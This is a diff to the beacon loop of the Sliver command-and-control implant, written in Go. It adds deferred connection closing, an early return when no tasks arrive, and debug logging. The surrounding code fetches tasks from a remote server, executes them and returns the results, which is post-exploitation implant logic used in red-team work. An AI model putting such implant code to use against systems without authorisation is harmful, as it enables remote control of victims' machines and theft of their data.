@@ -265,6 +265,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	if err != nil {
 		return err
 	}
+	defer beacon.Close()
 	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          BeaconID,
 		NextCheckin: nextCheckin.UTC().Unix(),
@@ -282,12 +283,22 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return err
 	}
 
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] Received %d task(s) from server", len(tasks.Tasks))
+	// {{end}}
+	if len(tasks.Tasks) == 0 {
+		return nil
+	}
+
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
 
 	for _, task := range tasks.Tasks {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] execute task %#v", task)
+		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
 			go handler(task.Data, func(data []byte, err error) {
@@ -298,6 +309,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				if err != nil {
 					log.Printf("[beacon] handler function returned an error: %s", err)
 				}
+				// {{end}}
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] task completed (id: %d)", task.ID)
 				// {{end}}
 				results = append(results, &sliverpb.Envelope{
 					ID:   task.ID,
@@ -315,6 +329,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	}
 
 	wg.Wait() // Wait for all tasks to complete
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] all tasks completed, sending results to server")
+	// {{end}}
 
 	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:    BeaconID,
@@ -325,7 +342,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		log.Printf("[beacon] Error sending results %s", err)
 		// {{end}}
 	}
-	beacon.Close()
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] all results sent to server, cleanup ...")
+	// {{end}}
 	return nil
 }
 
